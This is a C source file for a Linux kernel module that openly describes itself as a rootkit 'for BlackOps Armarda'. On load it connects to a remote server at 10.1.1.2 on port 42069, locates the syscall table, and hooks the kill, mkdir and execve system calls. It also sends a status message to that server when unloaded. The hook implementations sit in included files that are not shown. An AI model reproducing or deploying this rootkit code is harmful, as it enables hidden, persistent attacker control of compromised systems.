/*=================*\
kernel module imports
\*=================*/
#include <linux/init.h> //macros used to mark up functions   e.g. __init __exit
#include <linux/module.h> // core header for loading module into kernel
#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/string.h>

#include <custom/syscall_table.c> //functions for getting sycall syscall_table
#include <custom/hooks.c> //functions for hooking syscalls
#include <custom/hooked_syscalls.c> //functions of the hooked syscalls

static int __init ModuleInit(void) {
  printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
  server_connect("10.1.1.2", 42069);
  get_syscall_table();
  install_hook(&sys_kill);
  install_hook(&sys_mkdir);
  install_hook(&sys_execve);
  orig_kill = sys_kill.orig_syscall;
  orig_mkdir = sys_mkdir.orig_syscall;
  orig_execve = sys_execve.orig_syscall;
  return 0;
}
static void __exit ModuleExit(void) {
  remove_hook(&sys_kill);
  remove_hook(&sys_mkdir);
  server_print("[rootkit] module removed!!!");
  printk(KERN_DEBUG "[rootkit] removed\n"); //DEBUG
}




module_init(ModuleInit);
module_exit(ModuleExit);
MODULE_AUTHOR("Artemis's Angel"); //author
MODULE_DESCRIPTION("Rootkit for BlackOps Armarda"); //description
MODULE_LICENSE("GPL");// GPL license
MODULE_VERSION("0.01"); //version
